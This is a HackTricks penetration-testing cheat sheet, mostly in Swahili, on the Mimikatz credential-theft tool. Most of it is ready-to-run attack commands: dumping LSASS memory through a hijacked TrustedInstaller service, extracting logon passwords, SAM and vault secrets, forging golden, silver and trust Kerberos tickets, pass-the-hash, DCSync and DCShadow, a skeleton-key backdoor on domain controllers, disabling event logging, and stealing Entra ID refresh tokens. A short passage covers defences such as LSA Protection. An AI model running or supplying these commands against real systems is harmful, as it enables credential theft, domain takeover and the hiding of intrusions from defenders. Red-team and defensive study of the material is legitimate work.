# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ukurasa huu unategemea ule wa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Angalia asili kwa taarifa zaidi!

## LM and Clear-Text in memory

Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua muhimu zimetekelezwa ili kulinda dhidi ya credential theft:

- **LM hashes and plain-text passwords** hazihifadhiwi tena kwenye memory ili kuongeza usalama. Mpangilio maalum wa registry, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ lazima uwekewe thamani ya DWORD `0` ili kuzima Digest Authentication, kuhakikisha kwamba passwords za "clear-text" hazicached katika LSASS.

- **LSA Protection** imeanzishwa kulinda mchakato wa Local Security Authority (LSA) dhidi ya kusomwa kwa memory bila ruhusa na code injection. Hii hufanyika kwa kuweka LSASS kama protected process. Kuwasha LSA Protection kunahusisha:
1. Kubadilisha registry kwenye _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
2. Kutekeleza Group Policy Object (GPO) inayolazimisha mabadiliko haya ya registry katika managed devices zote.

Licha ya ulinzi huu, zana kama Mimikatz zinaweza kupita LSA Protection kwa kutumia drivers maalum, ingawa vitendo hivyo huenda vikarekodiwa kwenye event logs.

Kwenye workstations za kisasa hili ni muhimu zaidi kwa sababu **Credential Guard imewezeshwa kwa chaguo-msingi kwenye Windows 11 22H2+ nyingi na Windows Server 2025 domain-joined, non-DC systems**, huku **LSASS-as-PPL ikiwa imewezeshwa kwa chaguo-msingi kwenye fresh Windows 11 22H2+ installs**. Kwa vitendo, hii inamaanisha `sekurlsa::logonpasswords` mara nyingi hutoa material kidogo kuliko ambavyo tradecraft ya zamani ilitarajia, na operators wanazidi kuelekeza kwenye **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, au **CloudAP/PRT-oriented modules**. Kwa upande wa ulinzi, angalia [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators kawaida wana SeDebugPrivilege, ambayo huwezesha debugging programs. Privilege hii inaweza kuzuiwa ili kuzuia unauthorized memory dumps, mbinu ya kawaida inayotumiwa na attackers kutoa credentials kutoka memory. Hata hivyo, hata privilege hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya memory dumps kwa kutumia customized service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Hii huruhusu kudump `lsass.exe` memory hadi kwenye faili, ambalo linaweza kuchambuliwa baadaye kwenye mfumo mwingine ili kutoa credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Uharibifu wa event log katika Mimikatz unahusisha vitendo viwili vikuu: kufuta event logs na kupatch Event service ili kuzuia logging ya matukio mapya. Hapa chini ni commands za kutekeleza vitendo hivi:

#### Clearing Event Logs

- **Command**: Kitendo hiki kinalenga kufuta event logs, na kufanya iwe vigumu zaidi kufuatilia shughuli za kimakusudi mbaya.
- Mimikatz haitoi command ya moja kwa moja katika nyaraka zake za kawaida kwa kufuta event logs moja kwa moja kupitia command line yake. Hata hivyo, event log manipulation kwa kawaida huhusisha kutumia system tools au scripts nje ya Mimikatz ili kufuta logs maalum (mfano, kwa kutumia PowerShell au Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Command hii ya majaribio imeundwa kurekebisha tabia ya Event Logging Service, kwa ufanisi kuzuia isirekodi events mpya.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Command `privilege::debug` huhakikisha kwamba Mimikatz inafanya kazi na privileges zinazohitajika ili kurekebisha system services.
- Command `event::drop` kisha inapatch Event Logging service.

### Kerberos Ticket Attacks

Tumia commands hapa chini kama ukumbusho wa haraka wa syntax. Kurasa maalum za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), na [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zina maelezo ya sasa ya AES/PAC/opsec nuances.

### Golden Ticket Creation

Golden Ticket huruhusu impersonation ya access katika domain nzima. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Jina la domain.
- `/sid`: Security Identifier (SID) ya domain.
- `/user`: Jina la mtumiaji wa kuiga.
- `/krbtgt`: NTLM hash ya account ya KDC service ya domain.
- `/ptt`: Huinject ticket moja kwa moja kwenye memory.
- `/ticket`: Huhifadhi ticket kwa matumizi ya baadaye.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Uundaji wa Silver Ticket

Silver Tickets hutoa ufikiaji kwa huduma maalum. Amri na vigezo muhimu:

- Amri: Sawa na Golden Ticket lakini inalenga huduma maalum.
- Vigezo:
- `/service`: Huduma ya kulenga (kwa mfano, cifs, http).
- Vigezo vingine sawa na Golden Ticket.

Mfano:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Uundaji wa Trust Ticket

Trust Tickets hutumiwa kufikia rasilimali kati ya domains kwa kutumia trust relationships. Amri na parameters muhimu:

- Amri: Sawa na Golden Ticket lakini kwa trust relationships.
- Parameters:
- `/target`: FQDN ya domain lengwa.
- `/rc4`: NTLM hash ya trust account.

Mfano:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Amri Ziada za Kerberos

- **Kuorodhesha Tickets**:

- Command: `kerberos::list`
- Huorodhesha tickets zote za Kerberos kwa session ya sasa ya user.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Hu-inject tickets za Kerberos kutoka kwenye cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Inaruhusu kutumia ticket ya Kerberos kwenye session nyingine.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Kusafisha Tickets**:
- Command: `kerberos::purge`
- Huondoa tickets zote za Kerberos kutoka kwenye session.
- Ni muhimu kabla ya kutumia commands za ku-manipulate ticket ili kuepuka conflicts.

### Over-Pass-the-Hash / Pass-the-Key

Ikiwa `RC4` imezimwa au haitegemeki, Mimikatz inaweza patch **AES128/AES256 Kerberos keys** kwenye current logon session badala ya kutumia tu NT hash. Hii kwa kawaida inafaa zaidi kwa modern domains kuliko kuchukulia `sekurlsa::pth` kama NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` hutumia mchakato wa sasa badala ya kuzindua console mpya, jambo ambalo ni la kusaidia unapotaka mara moja kuendesha vitu kama `lsadump::dcsync` katika context ile ile.

### Active Directory Tampering

- **DCShadow**: Kwa muda fanya machine iigize DC kwa ajili ya AD object manipulation. Tazama [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Iga DC ili kuomba data ya password. Tazama [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Toa credentials kutoka LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Iga DC kwa kutumia data ya password ya computer account.

- _Hakuna command maalum iliyotolewa kwa NetSync katika context ya asili._

- **LSADUMP::SAM**: Fikia local SAM database.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dekripti secrets zilizohifadhiwa kwenye registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Weka NTLM hash mpya kwa user.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pata taarifa za trust authentication.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Kwenye hosts za **Entra ID** au **hybrid-joined**, `sekurlsa::cloudap` inaweza kuonyesha cached **Primary Refresh Token (PRT)** material kutoka LSASS. Ikiwa Proof-of-Possession key inayohusiana inalindwa na software, `dpapi::cloudapkd` inaweza kuunda clear/derived key material inayohitajika kwa workflows za baadaye za **Pass-the-PRT**.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Hii inakuwa ngumu zaidi wakati key imeungwa mkono na TPM, lakini inafaa kuikagua kwenye hybrid endpoints kwa sababu data ya CloudAP iliyohifadhiwa inaweza kuwa ya kuvutia zaidi kuliko output ya kawaida ya `wdigest`. Kwa cloud-side abuse chain, tazama [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inject backdoor kwenye LSASS kwenye DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Pata backup rights.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Pata debug privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Onyesha credentials za users walio-log in.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Toa Kerberos tickets kutoka kwenye memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Badilisha SID na SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: Impersonate tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Ruhusu multiple RDP sessions.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Orodhesha TS/RDP sessions.
- _No specific command provided for TS::Sessions in original context._

### Vault

- Toa passwords kutoka Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
